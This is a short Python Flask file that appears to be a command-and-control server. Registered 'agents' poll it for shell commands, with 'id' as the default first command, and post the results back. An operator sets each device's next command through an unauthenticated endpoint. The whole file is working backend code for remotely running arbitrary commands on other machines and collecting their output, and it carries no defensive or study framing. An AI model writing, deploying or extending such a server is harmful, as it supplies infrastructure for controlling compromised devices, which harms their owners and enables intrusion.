from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# In-memory command queue for demo (replace with DB in production)
device_commands = {}
device_outputs = {}

@app.route("/register", methods=["POST"])
def register():
    device_id = request.json.get("device_id")
    if device_id not in device_commands:
        device_commands[device_id] = "id"
        print(f"[+] New agent registered: {device_id}")
    return jsonify({"status": "registered"})

@app.route("/get_command/<device_id>", methods=["GET"])
def get_command(device_id):
    cmd = device_commands.get(device_id, "")
    print(f"[>] Sending command to {device_id}: {cmd}")
    return jsonify({"cmd": cmd})

@app.route("/post_output", methods=["POST"])
def post_output():
    data = request.json
    device_id = data.get("device_id")
    output = data.get("output")
    print(f"[<] Output from {device_id}:\n{output}")
    device_outputs[device_id] = output
    return jsonify({"status": "ok"})

@app.route("/set_command", methods=["POST"])
def set_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    device_commands[device_id] = command
    print(f"[!] Command for {device_id} set to: {command}")
    return jsonify({"status": "command set"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
